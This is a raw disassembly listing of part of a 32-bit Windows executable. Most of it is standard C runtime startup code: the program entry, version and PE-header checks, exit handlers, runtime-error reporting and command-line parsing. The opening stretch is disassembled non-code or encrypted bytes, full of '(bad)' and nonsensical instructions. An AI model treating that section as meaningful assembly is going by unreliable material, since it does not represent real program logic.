  424301:	mov    dh,0x9a
  424303:	(bad)  
  424304:	jmp    0x424339
  424306:	and    BYTE PTR [esi+edi*4-0x64],bh
  42430a:	cdq    
  42430b:	imul   edi,DWORD PTR [ebx+0x1f],0x35
  42430f:	push   esi
  424310:	pop    ecx
  424311:	inc    esp
  424312:	es icebp 
  424314:	jge    0x42436f
  424316:	xor    BYTE PTR ds:0x81de4477,0xa7
  42431d:	push   esp
  42431e:	sub    dl,dh
  424320:	mov    ch,0xf2
  424322:	call   0x279c:0x4a64210
  424329:	mov    ah,0xf8
  42432b:	retf   0xc7e9
  42432e:	test   eax,0x6191e948
  424333:	dec    ebp
  424334:	in     al,dx
  424335:	dec    edi
  424336:	fcomp  DWORD PTR [edx-0x2874f3f6]
  42433c:	fbstp  TBYTE PTR [edx-0x412b04d4]
  424342:	aas    
  424343:	scas   eax,DWORD PTR es:[edi]
  424344:	xchg   edx,eax
  424345:	in     al,0x4a
  424347:	es jmp edi
  42434a:	in     al,0x17
  42434c:	jge    0x42435e
  42434e:	test   DWORD PTR [eax+0x25aa8cfc],esi
  424354:	lock aas 
  424356:	setge  bh
  424359:	dec    esi
  42435a:	ss jno 0x4242f4
  42435d:	xor    ebx,eax
  42435f:	or     eax,0xddf4354c
  424364:	enter  0x5e69,0x7e
  424368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424369:	aad    0x82
  42436b:	rcr    edx,1
  42436d:	fcomp  DWORD PTR [eax-0x63]
  424370:	mov    cl,0xb7
  424372:	scas   al,BYTE PTR es:[edi]
  424373:	pop    ecx
  424374:	sbb    DWORD PTR [ecx+esi*2],ecx
  424377:	xchg   DWORD PTR [esi],eax
  424379:	out    dx,eax
  42437a:	add    eax,0x93ef99d1
  42437f:	cli    
  424380:	adc    al,ah
  424382:	(bad)  
  424383:	pop    edx
  424384:	aad    0x3
  424386:	sub    al,0xa5
  424388:	in     eax,dx
  424389:	mov    esi,0xe1174772
  42438e:	inc    esp
  42438f:	pop    edx
  424390:	or     ch,BYTE PTR [ecx+0x34c9c4d3]
  424396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424397:	fisub  DWORD PTR [ebx-0x4d]
  42439a:	mov    cl,0xfe
  42439c:	aas    
  42439d:	sahf   
  42439e:	add    DWORD PTR [ecx+0x542d9ed2],esp
  4243a4:	xchg   dh,cl
  4243a6:	adc    BYTE PTR [ebx-0x3b],0x4b
  4243aa:	dec    edx
  4243ab:	push   eax
  4243ac:	inc    ebp
  4243ad:	ds mov ah,0xa3
  4243b0:	mov    edi,0x3972d2b
  4243b5:	aad    0x92
  4243b7:	add    DWORD PTR [ecx-0x7b],ebp
  4243ba:	(bad)  
  4243bb:	out    dx,eax
  4243bc:	xor    ebx,ebx
  4243be:	pop    ecx
  4243bf:	addr16 jb 0x4243be
  4243c2:	xchg   BYTE PTR [eax],ah
  4243c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243c5:	test   al,0x8b
  4243c7:	mov    bl,0xb8
  4243c9:	or     DWORD PTR ds:0xc13f2c50,ebp
  4243cf:	dec    esp
  4243d0:	sbb    ch,bh
  4243d2:	lods   al,BYTE PTR ds:[esi]
  4243d3:	les    eax,FWORD PTR [ebx-0x5b]
  4243d6:	push   0xf2bb5b1e
  4243db:	das    
  4243dc:	jg     0x4243e9
  4243de:	xlat   BYTE PTR ds:[ebx]
  4243df:	std    
  4243e0:	jb     0x424390
  4243e2:	and    esp,ebx
  4243e4:	adc    dl,BYTE PTR [edi]
  4243e6:	or     eax,0xf37c0e50
  4243eb:	mov    edx,0x99e5cc02
  4243f0:	mov    ah,0xb3
  4243f2:	jo     0x42439a
  4243f4:	pop    esi
  4243f5:	inc    edi
  4243f6:	or     edx,DWORD PTR [edx+0x7d1c5433]
  4243fc:	add    edx,edi
  4243fe:	lock pop edi
  424400:	jo     0x424475
  424402:	test   eax,0x9f1018ff
  424407:	jl     0x424447
  424409:	in     al,0x62
  42440b:	cld    
  42440c:	mov    al,0x77
  42440e:	cmp    DWORD PTR [edi-0x47ef132c],edi
  424414:	jecxz  0x4243a7
  424416:	or     cl,BYTE PTR fs:[ebx+ebp*4]
  42441a:	cli    
  42441b:	mov    DWORD PTR [esi-0x68ae469a],ebx
  424421:	push   ds
  424422:	mov    ebp,0x2a698fbe
  424427:	mov    ebx,0x1a1862f3
  42442c:	fsub   st,st(2)
  42442e:	pop    esp
  42442f:	jnp    0x424426
  424431:	xchg   esi,eax
  424432:	mov    ah,0xe2
  424434:	push   ebp
  424435:	sub    edi,edx
  424437:	retf   0x14a5
  42443a:	aad    0xd8
  42443c:	sar    DWORD PTR [esi-0xaf666a4],0xf1
  424443:	sbb    BYTE PTR [esi-0x7e],dh
  424446:	cmp    eax,0x368de04f
  42444b:	fstp   DWORD PTR [ebx-0x4c]
  42444e:	pop    ss
  42444f:	popf   
  424450:	jno    0x424475
  424452:	clc    
  424453:	mov    edi,0x2b8d6c2f
  424458:	add    edi,ebp
  42445a:	aam    0xed
  42445c:	sub    DWORD PTR [ebp-0x42b92a03],ebp
  424462:	jns    0x42447b
  424464:	inc    esi
  424465:	scas   al,BYTE PTR es:[edi]
  424466:	pop    ss
  424467:	and    al,0x12
  424469:	into   
  42446a:	retf   
  42446b:	cld    
  42446c:	mov    edx,0x843cc70a
  424471:	add    al,0xaf
  424473:	xlat   BYTE PTR ds:[ebx]
  424474:	push   ds
  424475:	addr16 test eax,0xf8526c74
  42447b:	call   0x249a:0xaa335f4b
  424482:	cmp    eax,0x2b1668c5
  424487:	sar    BYTE PTR [esi-0x59e7717b],cl
  42448d:	mov    eax,0xc75a9183
  424492:	jae    0x424446
  424494:	sub    BYTE PTR [ebp+0x47],0xd5
  424498:	(bad)  
  424499:	jb     0x4244ee
  42449b:	aas    
  42449c:	adc    eax,0x3a18d726
  4244a1:	dec    ebx
  4244a2:	jp     0x4244cc
  4244a4:	add    DWORD PTR [ebx],esi
  4244a6:	push   0x71
  4244a8:	add    eax,0x6208ff5b
  4244ad:	push   esi
  4244ae:	scas   al,BYTE PTR es:[edi]
  4244af:	push   esp
  4244b0:	cdq    
  4244b1:	pop    esp
  4244b2:	and    eax,0x25b598ef
  4244b7:	and    al,0xa5
  4244b9:	add    edx,DWORD PTR ds:0x4273ce67
  4244bf:	push   edx
  4244c0:	adc    al,0xc9
  4244c2:	outs   dx,BYTE PTR ds:[esi]
  4244c3:	shr    BYTE PTR [edx+0x0],1
  4244c6:	push   0x0
  4244c8:	call   0x4244f0
  4244cd:	push   0xa
  4244cf:	push   0x0
  4244d1:	push   0x0
  4244d3:	call   DWORD PTR ds:0x429054
  4244d9:	xor    eax,eax
  4244db:	add    esp,0x10
  4244de:	ret    0x10
  4244e1:	nop
  4244e2:	nop
  4244e3:	nop
  4244e4:	nop
  4244e5:	nop
  4244e6:	nop
  4244e7:	nop
  4244e8:	nop
  4244e9:	nop
  4244ea:	nop
  4244eb:	nop
  4244ec:	nop
  4244ed:	nop
  4244ee:	nop
  4244ef:	nop
  4244f0:	jmp    DWORD PTR ds:0x429144
  4244f6:	jmp    DWORD PTR ds:0x429140
  4244fc:	cmp    DWORD PTR ds:0x4635bc,0x1
  424503:	jne    0x42450a
  424505:	call   0x424a48
  42450a:	push   DWORD PTR [esp+0x4]
  42450e:	call   0x4248d1
  424513:	push   0xff
  424518:	call   DWORD PTR ds:0x462cb4
  42451e:	pop    ecx
  42451f:	pop    ecx
  424520:	ret    
  424521:	cmp    DWORD PTR ds:0x4635bc,0x1
  424528:	jne    0x42452f
  42452a:	call   0x424a48
  42452f:	push   DWORD PTR [esp+0x4]
  424533:	call   0x4248d1
  424538:	push   0xff
  42453d:	call   0x424717
  424542:	pop    ecx
  424543:	pop    ecx
  424544:	ret    
  424545:	push   0x60
  424547:	push   0x429268
  42454c:	call   0x425434
  424551:	mov    edi,0x94
  424556:	mov    eax,edi
  424558:	call   0x425480
  42455d:	mov    DWORD PTR [ebp-0x18],esp
  424560:	mov    esi,esp
  424562:	mov    DWORD PTR [esi],edi
  424564:	push   esi
  424565:	call   DWORD PTR ds:0x429098
  42456b:	mov    ecx,DWORD PTR [esi+0x10]
  42456e:	mov    DWORD PTR ds:0x4635c4,ecx
  424574:	mov    eax,DWORD PTR [esi+0x4]
  424577:	mov    ds:0x4635d0,eax
  42457c:	mov    edx,DWORD PTR [esi+0x8]
  42457f:	mov    DWORD PTR ds:0x4635d4,edx
  424585:	mov    esi,DWORD PTR [esi+0xc]
  424588:	and    esi,0x7fff
  42458e:	mov    DWORD PTR ds:0x4635c8,esi
  424594:	cmp    ecx,0x2
  424597:	je     0x4245a5
  424599:	or     esi,0x8000
  42459f:	mov    DWORD PTR ds:0x4635c8,esi
  4245a5:	shl    eax,0x8
  4245a8:	add    eax,edx
  4245aa:	mov    ds:0x4635cc,eax
  4245af:	xor    esi,esi
  4245b1:	push   esi
  4245b2:	mov    edi,DWORD PTR ds:0x42902c
  4245b8:	call   edi
  4245ba:	cmp    WORD PTR [eax],0x5a4d
  4245bf:	jne    0x4245e0
  4245c1:	mov    ecx,DWORD PTR [eax+0x3c]
  4245c4:	add    ecx,eax
  4245c6:	cmp    DWORD PTR [ecx],0x4550
  4245cc:	jne    0x4245e0
  4245ce:	movzx  eax,WORD PTR [ecx+0x18]
  4245d2:	cmp    eax,0x10b
  4245d7:	je     0x4245f8
  4245d9:	cmp    eax,0x20b
  4245de:	je     0x4245e5
  4245e0:	mov    DWORD PTR [ebp-0x1c],esi
  4245e3:	jmp    0x42460c
  4245e5:	cmp    DWORD PTR [ecx+0x84],0xe
  4245ec:	jbe    0x4245e0
  4245ee:	xor    eax,eax
  4245f0:	cmp    DWORD PTR [ecx+0xf8],esi
  4245f6:	jmp    0x424606
  4245f8:	cmp    DWORD PTR [ecx+0x74],0xe
  4245fc:	jbe    0x4245e0
  4245fe:	xor    eax,eax
  424600:	cmp    DWORD PTR [ecx+0xe8],esi
  424606:	setne  al
  424609:	mov    DWORD PTR [ebp-0x1c],eax
  42460c:	push   0x1
  42460e:	call   0x4253e3
  424613:	pop    ecx
  424614:	test   eax,eax
  424616:	jne    0x424620
  424618:	push   0x1c
  42461a:	call   0x424521
  42461f:	pop    ecx
  424620:	call   0x42535a
  424625:	test   eax,eax
  424627:	jne    0x424631
  424629:	push   0x10
  42462b:	call   0x424521
  424630:	pop    ecx
  424631:	call   0x425243
  424636:	mov    DWORD PTR [ebp-0x4],esi
  424639:	call   0x425045
  42463e:	test   eax,eax
  424640:	jge    0x42464a
  424642:	push   0x1b
  424644:	call   0x4244fc
  424649:	pop    ecx
  42464a:	call   DWORD PTR ds:0x429094
  424650:	mov    ds:0x463d74,eax
  424655:	call   0x424f23
  42465a:	mov    ds:0x4635b4,eax
  42465f:	call   0x424e81
  424664:	test   eax,eax
  424666:	jge    0x424670
  424668:	push   0x8
  42466a:	call   0x4244fc
  42466f:	pop    ecx
  424670:	call   0x424c4e
  424675:	test   eax,eax
  424677:	jge    0x424681
  424679:	push   0x9
  42467b:	call   0x4244fc
  424680:	pop    ecx
  424681:	call   0x424759
  424686:	mov    DWORD PTR [ebp-0x20],eax
  424689:	cmp    eax,esi
  42468b:	je     0x424694
  42468d:	push   eax
  42468e:	call   0x4244fc
  424693:	pop    ecx
  424694:	mov    DWORD PTR [ebp-0x38],esi
  424697:	lea    eax,[ebp-0x64]
  42469a:	push   eax
  42469b:	call   DWORD PTR ds:0x429090
  4246a1:	call   0x424be5
  4246a6:	mov    DWORD PTR [ebp-0x68],eax
  4246a9:	test   BYTE PTR [ebp-0x38],0x1
  4246ad:	je     0x4246b5
  4246af:	movzx  eax,WORD PTR [ebp-0x34]
  4246b3:	jmp    0x4246b8
  4246b5:	push   0xa
  4246b7:	pop    eax
  4246b8:	push   eax
  4246b9:	push   DWORD PTR [ebp-0x68]
  4246bc:	push   esi
  4246bd:	push   esi
  4246be:	call   edi
  4246c0:	push   eax
  4246c1:	call   0x423030
  4246c6:	mov    edi,eax
  4246c8:	mov    DWORD PTR [ebp-0x6c],edi
  4246cb:	cmp    DWORD PTR [ebp-0x1c],esi
  4246ce:	jne    0x4246d6
  4246d0:	push   edi
  4246d1:	call   0x424891
  4246d6:	call   0x4248b3
  4246db:	jmp    0x424708
  4246dd:	mov    eax,DWORD PTR [ebp-0x14]
  4246e0:	mov    ecx,DWORD PTR [eax]
  4246e2:	mov    ecx,DWORD PTR [ecx]
  4246e4:	mov    DWORD PTR [ebp-0x70],ecx
  4246e7:	push   eax
  4246e8:	push   ecx
  4246e9:	call   0x424a81
  4246ee:	pop    ecx
  4246ef:	pop    ecx
  4246f0:	ret    
  4246f1:	mov    esp,DWORD PTR [ebp-0x18]
  4246f4:	mov    edi,DWORD PTR [ebp-0x70]
  4246f7:	cmp    DWORD PTR [ebp-0x1c],0x0
  4246fb:	jne    0x424703
  4246fd:	push   edi
  4246fe:	call   0x4248a2
  424703:	call   0x4248c2
  424708:	or     DWORD PTR [ebp-0x4],0xffffffff
  42470c:	mov    eax,edi
  42470e:	lea    esp,[ebp-0x7c]
  424711:	call   0x42546f
  424716:	ret    
  424717:	push   0x429284
  42471c:	call   DWORD PTR ds:0x42902c
  424722:	test   eax,eax
  424724:	je     0x42473c
  424726:	push   0x429274
  42472b:	push   eax
  42472c:	call   DWORD PTR ds:0x429028
  424732:	test   eax,eax
  424734:	je     0x42473c
  424736:	push   DWORD PTR [esp+0x4]
  42473a:	call   eax
  42473c:	push   DWORD PTR [esp+0x4]
  424740:	call   DWORD PTR ds:0x42909c
  424746:	int3   
  424747:	push   0x8
  424749:	call   0x4255ef
  42474e:	pop    ecx
  42474f:	ret    
  424750:	push   0x8
  424752:	call   0x42555b
  424757:	pop    ecx
  424758:	ret    
  424759:	mov    eax,ds:0x463d70
  42475e:	test   eax,eax
  424760:	je     0x424764
  424762:	call   eax
  424764:	push   esi
  424765:	push   edi
  424766:	mov    ecx,0x42b00c
  42476b:	mov    edi,0x42b018
  424770:	xor    eax,eax
  424772:	cmp    ecx,edi
  424774:	mov    esi,ecx
  424776:	jae    0x42478f
  424778:	test   eax,eax
  42477a:	jne    0x4247bb
  42477c:	mov    ecx,DWORD PTR [esi]
  42477e:	test   ecx,ecx
  424780:	je     0x424784
  424782:	call   ecx
  424784:	add    esi,0x4
  424787:	cmp    esi,edi
  424789:	jb     0x424778
  42478b:	test   eax,eax
  42478d:	jne    0x4247bb
  42478f:	push   0x425287
  424794:	call   0x425700
  424799:	mov    esi,0x42b000
  42479e:	mov    eax,esi
  4247a0:	mov    edi,0x42b008
  4247a5:	cmp    eax,edi
  4247a7:	pop    ecx
  4247a8:	jae    0x4247b9
  4247aa:	mov    eax,DWORD PTR [esi]
  4247ac:	test   eax,eax
  4247ae:	je     0x4247b2
  4247b0:	call   eax
  4247b2:	add    esi,0x4
  4247b5:	cmp    esi,edi
  4247b7:	jb     0x4247aa
  4247b9:	xor    eax,eax
  4247bb:	pop    edi
  4247bc:	pop    esi
  4247bd:	ret    
  4247be:	push   ebp
  4247bf:	mov    ebp,esp
  4247c1:	push   esi
  4247c2:	push   edi
  4247c3:	push   0x8
  4247c5:	call   0x4255ef
  4247ca:	xor    esi,esi
  4247cc:	inc    esi
  4247cd:	cmp    DWORD PTR ds:0x463604,esi
  4247d3:	pop    ecx
  4247d4:	jne    0x4247e6
  4247d6:	push   DWORD PTR [ebp+0x8]
  4247d9:	call   DWORD PTR ds:0x429064
  4247df:	push   eax
  4247e0:	call   DWORD PTR ds:0x4290a0
  4247e6:	cmp    DWORD PTR [ebp+0xc],0x0
  4247ea:	mov    al,BYTE PTR [ebp+0x10]
  4247ed:	mov    DWORD PTR ds:0x463600,esi
  4247f3:	mov    ds:0x4635fc,al
  4247f8:	jne    0x42484c
  4247fa:	mov    ecx,DWORD PTR ds:0x463d68
  424800:	test   ecx,ecx
  424802:	je     0x42482d
  424804:	mov    eax,ds:0x463d64
  424809:	sub    eax,0x4
  42480c:	cmp    eax,ecx
  42480e:	jmp    0x424826
  424810:	mov    eax,DWORD PTR [eax]
  424812:	test   eax,eax
  424814:	je     0x424818
  424816:	call   eax
  424818:	mov    eax,ds:0x463d64
  42481d:	sub    eax,0x4
  424820:	cmp    eax,DWORD PTR ds:0x463d68
  424826:	mov    ds:0x463d64,eax
  42482b:	jae    0x424810
  42482d:	mov    eax,0x42b01c
  424832:	mov    esi,0x42b020
  424837:	cmp    eax,esi
  424839:	mov    edi,eax
  42483b:	jae    0x42484c
  42483d:	mov    eax,DWORD PTR [edi]
  42483f:	test   eax,eax
  424841:	je     0x424845
  424843:	call   eax
  424845:	add    edi,0x4
  424848:	cmp    edi,esi
  42484a:	jb     0x42483d
  42484c:	mov    eax,0x42b024
  424851:	mov    esi,0x42b028
  424856:	cmp    eax,esi
  424858:	mov    edi,eax
  42485a:	jae    0x42486b
  42485c:	mov    eax,DWORD PTR [edi]
  42485e:	test   eax,eax
  424860:	je     0x424864
  424862:	call   eax
  424864:	add    edi,0x4
  424867:	cmp    edi,esi
  424869:	jb     0x42485c
  42486b:	cmp    DWORD PTR [ebp+0x10],0x0
  42486f:	pop    edi
  424870:	pop    esi
  424871:	je     0x42487c
  424873:	push   0x8
  424875:	call   0x42555b
  42487a:	jmp    0x42488e
  42487c:	push   DWORD PTR [ebp+0x8]
  42487f:	mov    DWORD PTR ds:0x463604,0x1
  424889:	call   0x424717
  42488e:	pop    ecx
  42488f:	pop    ebp
  424890:	ret    
  424891:	push   0x0
  424893:	push   0x0
  424895:	push   DWORD PTR [esp+0xc]
  424899:	call   0x4247be
  42489e:	add    esp,0xc
  4248a1:	ret    
  4248a2:	push   0x0
  4248a4:	push   0x1
  4248a6:	push   DWORD PTR [esp+0xc]
  4248aa:	call   0x4247be
  4248af:	add    esp,0xc
  4248b2:	ret    
  4248b3:	push   0x1
  4248b5:	push   0x0
  4248b7:	push   0x0
  4248b9:	call   0x4247be
  4248be:	add    esp,0xc
  4248c1:	ret    
  4248c2:	push   0x1
  4248c4:	push   0x1
  4248c6:	push   0x0
  4248c8:	call   0x4247be
  4248cd:	add    esp,0xc
  4248d0:	ret    
  4248d1:	push   ebp
  4248d2:	mov    ebp,esp
  4248d4:	sub    esp,0x10c
  4248da:	mov    eax,ds:0x462f30
  4248df:	xor    eax,DWORD PTR [ebp+0x4]
  4248e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4248e5:	push   ebx
  4248e6:	push   esi
  4248e7:	mov    DWORD PTR [ebp-0x4],eax
  4248ea:	xor    edx,edx
  4248ec:	push   edi
  4248ed:	xor    eax,eax
  4248ef:	cmp    ecx,DWORD PTR [eax*8+0x462cc0]
  4248f6:	je     0x4248fe
  4248f8:	inc    eax
  4248f9:	cmp    eax,0x12
  4248fc:	jb     0x4248ef
  4248fe:	mov    esi,eax
  424900:	shl    esi,0x3
  424903:	cmp    ecx,DWORD PTR [esi+0x462cc0]
  424909:	jne    0x424a32
  42490f:	mov    eax,ds:0x4635bc
  424914:	cmp    eax,0x1
  424917:	je     0x424a0d
  42491d:	cmp    eax,edx
  42491f:	jne    0x42492e
  424921:	cmp    DWORD PTR ds:0x462cb8,0x1
  424928:	je     0x424a0d
  42492e:	cmp    ecx,0xfc
  424934:	je     0x424a32
  42493a:	push   0x104
  42493f:	lea    eax,[ebp-0x10c]
  424945:	push   eax
  424946:	push   edx
  424947:	mov    BYTE PTR [ebp-0x8],dl
  42494a:	call   DWORD PTR ds:0x4290a8
  424950:	test   eax,eax
  424952:	jne    0x424967
  424954:	lea    eax,[ebp-0x10c]
  42495a:	push   0x4295dc
  42495f:	push   eax
  424960:	call   0x425810
  424965:	pop    ecx
  424966:	pop    ecx
  424967:	lea    eax,[ebp-0x10c]
  42496d:	push   eax
  42496e:	lea    edi,[ebp-0x10c]
  424974:	call   0x425a40
  424979:	inc    eax
  42497a:	cmp    eax,0x3c
  42497d:	pop    ecx
  42497e:	jbe    0x4249a9
  424980:	lea    eax,[ebp-0x10c]
  424986:	push   eax
  424987:	call   0x425a40
  42498c:	mov    edi,eax
  42498e:	lea    eax,[ebp-0x10c]
  424994:	sub    eax,0x3b
  424997:	push   0x3
  424999:	add    edi,eax
  42499b:	push   0x4295d8
  4249a0:	push   edi
  4249a1:	call   0x425910
  4249a6:	add    esp,0x10
  4249a9:	push   edi
  4249aa:	call   0x425a40
  4249af:	push   DWORD PTR [esi+0x462cc4]
  4249b5:	mov    ebx,eax
  4249b7:	call   0x425a40
  4249bc:	lea    eax,[ebx+eax*1+0x1c]
  4249c0:	pop    ecx
  4249c1:	add    eax,0x3
  4249c4:	pop    ecx
  4249c5:	and    eax,0xfffffffc
  4249c8:	call   0x425480
  4249cd:	mov    ebx,esp
  4249cf:	push   0x4295bc
  4249d4:	push   ebx
  4249d5:	call   0x425810
  4249da:	push   edi
  4249db:	push   ebx
  4249dc:	call   0x425820
  4249e1:	push   0x4295b8
  4249e6:	push   ebx
  4249e7:	call   0x425820
  4249ec:	push   DWORD PTR [esi+0x462cc4]
  4249f2:	push   ebx
  4249f3:	call   0x425820
  4249f8:	push   0x12010
  4249fd:	push   0x429590
  424a02:	push   ebx
  424a03:	call   0x425712
  424a08:	add    esp,0x2c
  424a0b:	jmp    0x424a32
  424a0d:	push   edx
  424a0e:	lea    eax,[ebp+0x8]
  424a11:	push   eax
  424a12:	lea    esi,[esi+0x462cc4]
  424a18:	push   DWORD PTR [esi]
  424a1a:	call   0x425a40
  424a1f:	pop    ecx
  424a20:	push   eax
  424a21:	push   DWORD PTR [esi]
  424a23:	push   0xfffffff4
  424a25:	call   DWORD PTR ds:0x4290a4
  424a2b:	push   eax
  424a2c:	call   DWORD PTR ds:0x429080
  424a32:	lea    esp,[ebp-0x118]
  424a38:	mov    ecx,DWORD PTR [ebp-0x4]
  424a3b:	xor    ecx,DWORD PTR [ebp+0x4]
  424a3e:	call   0x425afc
  424a43:	pop    edi
  424a44:	pop    esi
  424a45:	pop    ebx
  424a46:	leave  
  424a47:	ret    
  424a48:	mov    eax,ds:0x4635bc
  424a4d:	cmp    eax,0x1
  424a50:	je     0x424a5f
  424a52:	test   eax,eax
  424a54:	jne    0x424a80
  424a56:	cmp    DWORD PTR ds:0x462cb8,0x1
  424a5d:	jne    0x424a80
  424a5f:	push   0xfc
  424a64:	call   0x4248d1
  424a69:	mov    eax,ds:0x463608
  424a6e:	test   eax,eax
  424a70:	pop    ecx
  424a71:	je     0x424a75
  424a73:	call   eax
  424a75:	push   0xff
  424a7a:	call   0x4248d1
  424a7f:	pop    ecx
  424a80:	ret    
  424a81:	push   ebp
  424a82:	mov    ebp,esp
  424a84:	push   ecx
  424a85:	push   ebx
  424a86:	push   esi
  424a87:	push   edi
  424a88:	call   0x4252e9
  424a8d:	mov    edi,DWORD PTR [ebp+0x8]
  424a90:	mov    esi,eax
  424a92:	mov    edx,DWORD PTR [esi+0x54]
  424a95:	mov    eax,ds:0x462dd4
  424a9a:	mov    ecx,edx
  424a9c:	cmp    DWORD PTR [ecx],edi
  424a9e:	je     0x424aad
  424aa0:	lea    ebx,[eax+eax*2]
  424aa3:	add    ecx,0xc
  424aa6:	lea    ebx,[edx+ebx*4]
  424aa9:	cmp    ecx,ebx
  424aab:	jb     0x424a9c
  424aad:	lea    eax,[eax+eax*2]
  424ab0:	lea    eax,[edx+eax*4]
  424ab3:	cmp    ecx,eax
  424ab5:	jae    0x424abb
  424ab7:	cmp    DWORD PTR [ecx],edi
  424ab9:	je     0x424abd
  424abb:	xor    ecx,ecx
  424abd:	test   ecx,ecx
  424abf:	je     0x424bd7
  424ac5:	mov    ebx,DWORD PTR [ecx+0x8]
  424ac8:	test   ebx,ebx
  424aca:	mov    DWORD PTR [ebp+0x8],ebx
  424acd:	je     0x424bd7
  424ad3:	cmp    ebx,0x5
  424ad6:	jne    0x424ae4
  424ad8:	and    DWORD PTR [ecx+0x8],0x0
  424adc:	xor    eax,eax
  424ade:	inc    eax
  424adf:	jmp    0x424be0
  424ae4:	cmp    ebx,0x1
  424ae7:	je     0x424bd2
  424aed:	mov    eax,DWORD PTR [esi+0x58]
  424af0:	mov    DWORD PTR [ebp-0x4],eax
  424af3:	mov    eax,DWORD PTR [ebp+0xc]
  424af6:	mov    DWORD PTR [esi+0x58],eax
  424af9:	mov    eax,DWORD PTR [ecx+0x4]
  424afc:	cmp    eax,0x8
  424aff:	jne    0x424bc4
  424b05:	mov    edx,DWORD PTR ds:0x462dc8
  424b0b:	mov    eax,ds:0x462dcc
  424b10:	add    eax,edx
  424b12:	cmp    edx,eax
  424b14:	jge    0x424b3d
  424b16:	lea    eax,[edx+edx*2]
  424b19:	shl    eax,0x2
  424b1c:	mov    edi,DWORD PTR [esi+0x54]
  424b1f:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424b24:	mov    edi,DWORD PTR ds:0x462dc8
  424b2a:	mov    ebx,DWORD PTR ds:0x462dcc
  424b30:	inc    edx
  424b31:	add    ebx,edi
  424b33:	add    eax,0xc
  424b36:	cmp    edx,ebx
  424b38:	jl     0x424b1c
  424b3a:	mov    ebx,DWORD PTR [ebp+0x8]
  424b3d:	mov    ecx,DWORD PTR [ecx]
  424b3f:	cmp    ecx,0xc000008e
  424b45:	mov    edi,DWORD PTR [esi+0x5c]
  424b48:	jne    0x424b53
  424b4a:	mov    DWORD PTR [esi+0x5c],0x83
  424b51:	jmp    0x424bb7
  424b53:	cmp    ecx,0xc0000090
  424b59:	jne    0x424b64
  424b5b:	mov    DWORD PTR [esi+0x5c],0x81
  424b62:	jmp    0x424bb7
  424b64:	cmp    ecx,0xc0000091
  424b6a:	jne    0x424b75
  424b6c:	mov    DWORD PTR [esi+0x5c],0x84
  424b73:	jmp    0x424bb7
  424b75:	cmp    ecx,0xc0000093
  424b7b:	jne    0x424b86
  424b7d:	mov    DWORD PTR [esi+0x5c],0x85
  424b84:	jmp    0x424bb7
  424b86:	cmp    ecx,0xc000008d
  424b8c:	jne    0x424b97
  424b8e:	mov    DWORD PTR [esi+0x5c],0x82
  424b95:	jmp    0x424bb7
  424b97:	cmp    ecx,0xc000008f
  424b9d:	jne    0x424ba8
  424b9f:	mov    DWORD PTR [esi+0x5c],0x86
  424ba6:	jmp    0x424bb7
  424ba8:	cmp    ecx,0xc0000092
  424bae:	jne    0x424bb7
  424bb0:	mov    DWORD PTR [esi+0x5c],0x8a
  424bb7:	push   DWORD PTR [esi+0x5c]
  424bba:	push   0x8
  424bbc:	call   ebx
  424bbe:	pop    ecx
  424bbf:	mov    DWORD PTR [esi+0x5c],edi
  424bc2:	jmp    0x424bcb
  424bc4:	and    DWORD PTR [ecx+0x8],0x0
  424bc8:	push   eax
  424bc9:	call   ebx
  424bcb:	mov    eax,DWORD PTR [ebp-0x4]
  424bce:	pop    ecx
  424bcf:	mov    DWORD PTR [esi+0x58],eax
  424bd2:	or     eax,0xffffffff
  424bd5:	jmp    0x424be0
  424bd7:	push   DWORD PTR [ebp+0xc]
  424bda:	call   DWORD PTR ds:0x4290ac
  424be0:	pop    edi
  424be1:	pop    esi
  424be2:	pop    ebx
  424be3:	leave  
  424be4:	ret    
  424be5:	cmp    DWORD PTR ds:0x463d6c,0x0
  424bec:	jne    0x424bf3
  424bee:	call   0x42601c
  424bf3:	push   esi
  424bf4:	mov    esi,DWORD PTR ds:0x463d74
  424bfa:	test   esi,esi
  424bfc:	jne    0x424c05
  424bfe:	mov    esi,0x4295f3
  424c03:	jmp    0x424c4a
  424c05:	mov    al,BYTE PTR [esi]
  424c07:	cmp    al,0x22
  424c09:	jne    0x424c33
  424c0b:	inc    esi
  424c0c:	mov    al,BYTE PTR [esi]
  424c0e:	cmp    al,0x22
  424c10:	je     0x424c43
  424c12:	test   al,al
  424c14:	je     0x424c2c
  424c16:	movzx  eax,al
  424c19:	push   eax
  424c1a:	call   0x425b3b
  424c1f:	test   eax,eax
  424c21:	pop    ecx
  424c22:	je     0x424c25
  424c24:	inc    esi
  424c25:	inc    esi
  424c26:	mov    al,BYTE PTR [esi]
  424c28:	cmp    al,0x22
  424c2a:	jne    0x424c12
  424c2c:	cmp    BYTE PTR [esi],0x22
  424c2f:	jne    0x424c44
  424c31:	jmp    0x424c43
  424c33:	cmp    al,0x20
  424c35:	jbe    0x424c44
  424c37:	inc    esi
  424c38:	cmp    BYTE PTR [esi],0x20
  424c3b:	ja     0x424c37
  424c3d:	jmp    0x424c44
  424c3f:	cmp    al,0x20
  424c41:	ja     0x424c4a
  424c43:	inc    esi
  424c44:	mov    al,BYTE PTR [esi]
  424c46:	test   al,al
  424c48:	jne    0x424c3f
  424c4a:	mov    eax,esi
  424c4c:	pop    esi
  424c4d:	ret    
  424c4e:	push   ebx
  424c4f:	xor    ebx,ebx
  424c51:	cmp    DWORD PTR ds:0x463d6c,ebx
  424c57:	push   esi
  424c58:	push   edi
  424c59:	jne    0x424c60
  424c5b:	call   0x42601c
  424c60:	mov    esi,DWORD PTR ds:0x4635b4
  424c66:	xor    edi,edi
  424c68:	cmp    esi,ebx
  424c6a:	jne    0x424c7e
  424c6c:	jmp    0x424c9e
  424c6e:	cmp    al,0x3d
  424c70:	je     0x424c73
  424c72:	inc    edi
  424c73:	push   esi
  424c74:	call   0x425a40
  424c79:	pop    ecx
  424c7a:	lea    esi,[esi+eax*1+0x1]
  424c7e:	mov    al,BYTE PTR [esi]
  424c80:	cmp    al,bl
  424c82:	jne    0x424c6e
  424c84:	lea    eax,[edi*4+0x4]
  424c8b:	push   eax
  424c8c:	call   0x426152
  424c91:	mov    edi,eax
  424c93:	cmp    edi,ebx
  424c95:	pop    ecx
  424c96:	mov    DWORD PTR ds:0x4635e4,edi
  424c9c:	jne    0x424ca3
  424c9e:	or     eax,0xffffffff
  424ca1:	jmp    0x424cfb
